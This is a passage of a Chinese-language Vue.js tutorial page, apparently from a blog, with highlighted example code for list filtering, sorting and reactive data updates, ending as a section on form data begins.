class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入名字&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) of filPerons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//用watch实现</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">// 关键词</span></span></span><br><span class="line"><span class="javascript">            keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 数据</span></span></span><br><span class="line">            persons:[</span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">21</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">22</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span></span><br><span class="line">            ],</span><br><span class="line"><span class="javascript">            <span class="comment">// 过滤后的数据</span></span></span><br><span class="line">            filPerons:[]</span><br><span class="line">        &#125;,</span><br><span class="line">        watch:&#123;</span><br><span class="line">            keyWord:&#123;</span><br><span class="line"><span class="javascript">                <span class="comment">// 为了一上来就显示列表的数据</span></span></span><br><span class="line"><span class="javascript">                immediate:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 用indexOf()方法，假如去查找一个空值，则会返回0，而不会返回-1</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">handler</span>(<span class="params">val</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// filter(p):p表示person数组中的每一个对象</span></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.filPerons = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="comment">// 根据关键词去查找，查找到了返回一个新的数组</span></span></span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> p.name.indexOf(val) !== -<span class="number">1</span></span></span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;) </span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//用computed实现</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">// 关键词</span></span></span><br><span class="line"><span class="javascript">            keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 列表数据</span></span></span><br><span class="line">            persons:[</span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">21</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">22</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        computed:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">filPerons</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// filter(p):p表示person数组中的每一个对象</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 根据关键词去查找，查找到了返回一个新的数组</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord) !== -<span class="number">1</span></span></span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;) </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220418205308814.png" alt=""></p><h3 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入名字&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 2&quot;</span>&gt;</span>年龄升序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 1&quot;</span>&gt;</span>年龄降序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 0&quot;</span>&gt;</span>原顺序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) of filPerons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            sortType:<span class="number">0</span>, <span class="comment">//0原顺序 1降序 2升序</span></span></span><br><span class="line">            persons:[</span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">30</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">31</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;, </span><br><span class="line">        computed:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">filPerons</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> arr = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord) !== -<span class="number">1</span></span></span><br><span class="line">                &#125;)</span><br><span class="line"><span class="javascript">                <span class="comment">//判断一下是否需要排序</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(<span class="built_in">this</span>.sortType)&#123;</span></span><br><span class="line"><span class="javascript">                    arr.sort(<span class="function">(<span class="params">p1,p2</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> <span class="built_in">this</span>.sortType === <span class="number">1</span> ? p2.age-p1.age : p1.age-p2.age</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="comment">// 排序完返回</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> arr</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;) </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220418205404529.png" alt=""></p><h3 id="Vue检测data对象的数据"><a href="#Vue检测data对象的数据" class="headerlink" title="Vue检测data对象的数据"></a>Vue检测data对象的数据</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue监视数据的原理：</span></span><br><span class="line"><span class="comment">1. vue会监视data中所有层次的数据。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. 如何监测对象中的数据？</span></span><br><span class="line"><span class="comment">通过setter实现监视，且要在new Vue时就传入要监测的数据。</span></span><br><span class="line"><span class="comment">(1).对象中后追加的属性，Vue默认不做响应式处理</span></span><br><span class="line"><span class="comment">(2).如需给后添加的属性做响应式，请使用如下API：</span></span><br><span class="line"><span class="comment">Vue.set(target，propertyName/index，value) 或 </span></span><br><span class="line"><span class="comment">vm.$set(target，propertyName/index，value)//为添加的属性创建set()和get()方法</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3. 如何监测数组中的数据？</span></span><br><span class="line"><span class="comment">通过包裹数组（Vue实例的数组方法，而不是正常的数组方法）更新元素的方法实现，本质就是做了两件事：</span></span><br><span class="line"><span class="comment">(1).调用原生对应的方法对数组进行更新（正常的数组方法起作用）。</span></span><br><span class="line"><span class="comment">(2).重新解析模板，进而更新页面。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4.在Vue修改数组中的某个元素一定要用如下方法：</span></span><br><span class="line"><span class="comment">1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</span></span><br><span class="line"><span class="comment">错误的示范：this.Student[0] = &quot;陈小胖&quot;//不奏效，没有响应式数据，虽然原数据发生改变了，但是之前用到的数据的  页面是不会更新的</span></span><br><span class="line"><span class="comment">2.Vue.set() 或 vm.$set()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5.特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据（data）对象 添加属性！！！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6.数据劫持：</span></span><br><span class="line"><span class="comment">data中的数据一改变，set()方法就把这个改变的数据截取下来，然后做两件事情：</span></span><br><span class="line"><span class="comment">1.截取下来的数据重新赋值给改变的属性</span></span><br><span class="line"><span class="comment">2.重新解析Vue模板</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.age++&quot;</span>&gt;</span>年龄+1岁<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加性别属性，默认值：男<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.sex = &#x27;未知&#x27; &quot;</span>&gt;</span>修改性别<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addFriend&quot;</span>&gt;</span>在列表首位添加一个朋友<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateFirstFriendName&quot;</span>&gt;</span>修改第一个朋友的名字为：张三<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addHobby&quot;</span>&gt;</span>添加一个爱好<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateHobby&quot;</span>&gt;</span>修改第一个爱好为：开车<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;removeSmoke&quot;</span>&gt;</span>过滤掉爱好中的抽烟<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>姓名：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>年龄：&#123;&#123;student.age&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123;h&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(f,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123;f.name&#125;&#125;--&#123;&#123;f.age&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            student:&#123;</span><br><span class="line"><span class="javascript">                name:<span class="string">&#x27;tom&#x27;</span>,</span></span><br><span class="line">                age:18,</span><br><span class="line"><span class="javascript">                hobby:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span><br><span class="line">                friends:[</span><br><span class="line"><span class="javascript">                    &#123;<span class="attr">name</span>:<span class="string">&#x27;jerry&#x27;</span>,<span class="attr">age</span>:<span class="number">35</span>&#125;,</span></span><br><span class="line"><span class="javascript">                    &#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">36</span>&#125;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// 给对象添加属性</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">addFriend</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 给数组添加数据</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.student.friends.unshift(&#123;<span class="attr">name</span>:<span class="string">&#x27;jack&#x27;</span>,<span class="attr">age</span>:<span class="number">70</span>&#125;)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">updateFirstFriendName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 修改数组中数据是对象的属性</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.student.friends[<span class="number">0</span>].name = <span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">addHobby</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 修改数组的数据</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.student.hobby.push(<span class="string">&#x27;学习&#x27;</span>)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">updateHobby</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// this.student.hobby.splice(0,1,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// Vue.set(this.student.hobby,0,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$set(<span class="built_in">this</span>.student.hobby,<span class="number">0</span>,<span class="string">&#x27;开车&#x27;</span>)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">removeSmoke</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 过滤不想要的数据，重新赋值给原数组</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.student.hobby = <span class="built_in">this</span>.student.hobby.filter(<span class="function">(<span class="params">h</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> h !== <span class="string">&#x27;抽烟&#x27;</span></span></span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="收集表单数据"><a href="#收集表单数据" class="headerlink" title="收集表单数据"></a>收集表单数据</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">收集表单数据：</span></span><br><span class="line"><span class="comment">若：&lt;input type=&quot;text&quot;/&gt;，则v-model收集的是value值，用户输入的就是value值。</span></span><br><span class="line"><span class="comment">若：&lt;input type=&quot;radio&quot;/&gt;，则v-model收集的是value值，且要给标签配置value值。</span></span><br><span class="line"><span class="comment">若：&lt;input type=&quot;checkbox&quot;/&gt;</span></span><br><span class="line"><span 